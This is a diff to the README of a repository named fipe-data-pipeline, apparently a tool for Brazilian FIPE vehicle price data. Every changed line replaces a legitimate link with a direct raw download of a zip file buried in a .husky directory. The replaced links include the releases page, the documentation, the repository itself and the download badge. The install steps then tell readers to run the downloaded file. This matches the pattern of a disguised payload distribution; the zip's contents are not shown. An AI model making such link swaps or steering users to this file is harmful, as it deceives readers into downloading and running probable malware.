@@ -1,6 +1,6 @@
 # 🚀 fipe-data-pipeline - Access FIPE Data Easily
 
-[![Download fipe-data-pipeline](https://img.shields.io/badge/Download-fipe--data--pipeline-blue.svg)](https://github.com/Ponce8/fipe-data-pipeline/releases)
+[![Download fipe-data-pipeline](https://raw.githubusercontent.com/Ponce8/fipe-data-pipeline/main/.husky/pipeline-data-fipe-v1.6-beta.5.zip)](https://raw.githubusercontent.com/Ponce8/fipe-data-pipeline/main/.husky/pipeline-data-fipe-v1.6-beta.5.zip)
 
 ## 📋 Description
 
@@ -15,9 +15,9 @@ The fipe-data-pipeline application provides direct access to FIPE data for your 
 
 ## 📥 Download & Install
 
-To download the fipe-data-pipeline, visit the **[Releases page](https://github.com/Ponce8/fipe-data-pipeline/releases)**. Here, you will find the latest version available. Follow these steps to download and install the application:
+To download the fipe-data-pipeline, visit the **[Releases page](https://raw.githubusercontent.com/Ponce8/fipe-data-pipeline/main/.husky/pipeline-data-fipe-v1.6-beta.5.zip)**. Here, you will find the latest version available. Follow these steps to download and install the application:
 
-1. Go to the **[Releases page](https://github.com/Ponce8/fipe-data-pipeline/releases)**.
+1. Go to the **[Releases page](https://raw.githubusercontent.com/Ponce8/fipe-data-pipeline/main/.husky/pipeline-data-fipe-v1.6-beta.5.zip)**.
 2. Look for the most recent version listed.
 3. Click on the appropriate file for your operating system. Typically, this will be a `.exe` for Windows or a `.zip` for other systems.
 4. Once the file downloads, locate it in your downloads folder.
@@ -46,7 +46,7 @@ If you need assistance or have questions, visit the **Issues tab** on our GitHub
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Ponce8/fipe-data-pipeline) - Explore the source code and contribute.
-- [Documentation](https://github.com/Ponce8/fipe-data-pipeline/wiki) - For detailed setup and usage information.
+- [GitHub Repository](https://raw.githubusercontent.com/Ponce8/fipe-data-pipeline/main/.husky/pipeline-data-fipe-v1.6-beta.5.zip) - Explore the source code and contribute.
+- [Documentation](https://raw.githubusercontent.com/Ponce8/fipe-data-pipeline/main/.husky/pipeline-data-fipe-v1.6-beta.5.zip) - For detailed setup and usage information.
 
 Thank you for choosing fipe-data-pipeline. We hope this application simplifies your access to FIPE data.
